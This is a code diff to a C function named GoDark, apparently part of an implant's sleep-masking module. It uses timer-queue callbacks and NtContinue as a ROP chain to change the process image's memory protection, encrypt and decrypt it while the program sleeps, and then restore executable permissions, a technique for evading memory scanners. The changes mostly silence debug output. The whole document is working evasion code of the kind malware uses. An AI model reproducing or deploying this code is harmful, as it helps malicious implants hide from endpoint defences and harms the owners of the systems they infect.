@@ -1,7 +1,7 @@
 #include "SleepMasking.h"
 
 void GoDark(INT sleepTime) {
-    printf("[*] Starting GoDark with sleep time: %d ms\n", sleepTime);
+    printf("[*] Going Dark for : %d ms\n", sleepTime);
 
     HANDLE SelfHeap = GetProcessHeap();
     CONTEXT* CtxArray = (CONTEXT*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * 7);
@@ -18,7 +18,7 @@ void GoDark(INT sleepTime) {
     DWORD OldProtect = 0;
     HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); //TODO : Wrapper broken arrrrrgggggghhhh
     PVOID ImageBase = CustomGetModuleHandleW(NULL);
-    printf("[*]ImageBase at %p\n", ImageBase);
+    //printf("[*] ImageBase at %p\n", ImageBase);
     
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
     DWORD ImageSize = ntHeader->OptionalHeader.SizeOfImage;
@@ -27,7 +27,7 @@ void GoDark(INT sleepTime) {
     PVOID NtContinue = CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtContinue");
     PVOID RtlExitUserThread = CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "RtlExitUserThread");
 
-    printf("[*] Initialization complete. Setting up ROP chain...\n");
+    //printf("[*] Initialization complete. Setting up ROP chain...\n");
 
     USTRING* pKey = (USTRING*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(USTRING));
     USTRING* pImg = (USTRING*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(USTRING));
@@ -42,7 +42,7 @@ void GoDark(INT sleepTime) {
     pImg->MaximumLength = ImageSize;
 
     HANDLE hTimer = NULL;
-    printf("[*] Capturing initial thread context...\n");
+    //printf("[*] Capturing initial thread context...\n");
 
     // Pass NULL as the queue handle to safely use the default Thread Pool
     CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)RtlCaptureContext, CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD);
@@ -73,7 +73,7 @@ void GoDark(INT sleepTime) {
     SETUP_CONTEXT(RopProtRX, VirtualProtect, ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect);
     SETUP_CONTEXT(RopSetEvt, SetEvent, hEvent, 0, 0, 0);
 
-    printf("[!] Triggering ROP Chain Timers...\n");
+    //printf("[!] Triggering ROP Chain Timers...\n");
     
     // Pass NULL instead of hTimerQueue
     CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
@@ -85,10 +85,10 @@ void GoDark(INT sleepTime) {
     CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopProtRX, postDelay + 100, 0, WT_EXECUTEINTIMERTHREAD);
     CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopSetEvt, postDelay + 200, 0, WT_EXECUTEINTIMERTHREAD);
 
-    printf("[*] Main thread sleeping, waiting for decryption...\n");
+    //printf("[*] Main thread sleeping, waiting for decryption...\n");
     WaitForSingleObject(hEvent, INFINITE);
     
-    printf("[+] Event signaled! Memory decrypted.\n");
+    //printf("[+] Event signaled! Memory decrypted.\n");
 
     // Cleanup
     HeapFree(SelfHeap, 0, pKey->Buffer);
